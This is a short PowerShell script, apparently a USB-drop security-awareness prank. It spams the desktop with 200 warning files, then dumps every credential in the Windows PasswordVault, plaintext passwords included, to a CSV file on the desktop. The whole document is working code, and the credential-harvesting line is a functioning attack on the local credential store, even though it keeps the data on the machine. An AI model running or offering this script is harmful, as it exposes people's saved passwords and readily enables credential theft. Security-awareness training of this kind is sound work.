﻿foreach ($i in 1..200){
        new-item "$env:HOMEDRIVE$env:HOMEPATH\desktop\I_should_not_use_unknown_USBs-$i.txt" -ItemType File -Force -Value "DONT BE A SECURITYRISK!`r`n"  
} 
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$($($(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }) | select resource,username,password | ConvertTo-Csv | out-file "$env:HOMEDRIVE$env:HOMEPATH\desktop\This-Could-have-Been-stolen.csv")